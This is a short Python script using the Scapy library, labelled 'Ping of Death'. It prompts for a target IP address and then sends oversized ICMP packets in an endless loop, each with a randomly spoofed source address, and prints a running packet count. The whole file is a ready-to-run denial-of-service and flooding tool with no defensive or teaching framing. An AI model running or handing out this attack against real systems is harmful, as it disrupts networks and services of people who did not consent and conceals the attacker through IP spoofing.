#!/usr/bin/env python3

from scapy.all import *
import random

def RandomIP():
    #
    random_addr = ""
    #
    for i in range(1,4):
        #
        value = random.randint(1,255)
        #
        random_addr += str(value)+'.'
        #
    random_addr = random_addr+str(random.randint(1,255))
    #
    return random_addr


def main():
    #
    print("<-- Ping of Death -->")
    #
    print()
    #
    time.sleep(1)
    #
    destination_ip = input("[+] Enter the target IP-> ")
    #
    count = 0
    #
    while(True):
        #
        source_ip = RandomIP()
        #
        ip_header = IP(src=source_ip,dst=destination_ip)
        #
        packet = ip_header/ICMP()/("X"*60000)
        #
        count += 1
        #
        print("[*] %s sent Ping of Death to : %s | Packet Count %i " % (source_ip,destination_ip,count))
        #
        send(packet,verbose=False)

if(__name__ == '__main__'):
    #
    main()
